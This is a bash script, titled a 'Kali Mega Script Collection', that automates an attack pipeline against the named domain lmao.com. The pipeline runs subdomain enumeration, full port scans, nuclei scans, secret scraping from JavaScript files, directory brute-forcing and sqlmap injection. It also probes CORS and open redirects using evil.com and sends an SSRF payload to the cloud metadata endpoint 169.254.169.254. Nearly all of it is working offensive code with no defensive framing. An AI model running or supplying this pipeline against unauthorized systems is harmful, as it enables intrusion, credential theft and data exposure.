# === Kali Mega Script Collection ===
# Target: (lmao.com)

TARGET_DOMAIN="lmao.com"
WORDLIST="/usr/share/wordlists/dirb/common.txt"
OUTPUT_DIR="recon-output"
mkdir -p $OUTPUT_DIR

# --- 1. Recon (Subdomain Discovery + DNS Resolution) ---
subfinder -d $TARGET_DOMAIN -silent > $OUTPUT_DIR/subs.txt
cat $OUTPUT_DIR/subs.txt | dnsx -silent -a -resp > $OUTPUT_DIR/dns-resolved.txt

# --- 2. Enumeration (Port scan + Tech detect) ---
httpx -l $OUTPUT_DIR/subs.txt -ports 80,443 -title -tech-detect -status-code -o $OUTPUT_DIR/httpx.txt
nmap -iL $OUTPUT_DIR/subs.txt -Pn -p- -T4 -oA $OUTPUT_DIR/nmap_full_scan

# --- 3. Vulnerability Scanning (Nuclei templates) ---
nuclei -l $OUTPUT_DIR/subs.txt -t ~/nuclei-templates/ -o $OUTPUT_DIR/nuclei-results.txt

# --- 4. JS File Extraction & Secret Detection ---
cat $OUTPUT_DIR/httpx.txt | grep -oP 'https?://[^ ]+' | hakrawler -subs -u -d 3 -timeout 5 > $OUTPUT_DIR/js-links.txt
cat $OUTPUT_DIR/js-links.txt | grep -Ei '\.js$' | tee $OUTPUT_DIR/js-files.txt
cat $OUTPUT_DIR/js-files.txt | xargs -n 1 curl -s | gf secrets > $OUTPUT_DIR/js-secrets.txt

# --- 5. Directory Bruteforcing ---
while read url; do
  ffuf -u "$url/FUZZ" -w $WORDLIST -mc 200,204,403,301,302 -o $OUTPUT_DIR/ffuf_$(echo $url | cut -d/ -f3).json
done < $OUTPUT_DIR/subs.txt

# --- 6. SQLi Injection Testing ---
grep -Ei '=[0-9]+' $OUTPUT_DIR/httpx.txt | tee $OUTPUT_DIR/param_urls.txt
while read u; do
  sqlmap -u "$u" --batch --crawl=1 --random-agent --level=2 --risk=2 --batch --output-dir=$OUTPUT_DIR/sqlmap
done < $OUTPUT_DIR/param_urls.txt

# --- 7. CORS + Redirect Abuse Check ---
for sub in $(cat $OUTPUT_DIR/subs.txt); do
  curl -s -I -H "Origin: https://evil.com" "https://$sub" | grep -i access-control >> $OUTPUT_DIR/cors-leaks.txt
  curl -s -L "https://$sub/?next=https://evil.com" | grep evil.com >> $OUTPUT_DIR/open-redirects.txt
done

# --- 8. SSRF Check on Common Endpoints ---
SSRF_PAYLOAD="http://169.254.169.254/latest/meta-data"
while read sub; do
  curl -s "https://$sub/api?url=$SSRF_PAYLOAD" | grep -iE "instance|hostname|ami" >> $OUTPUT_DIR/ssrf-results.txt
done < $OUTPUT_DIR/subs.txt

echo -e "\n[+] Recon Complete. Review $OUTPUT_DIR for details."
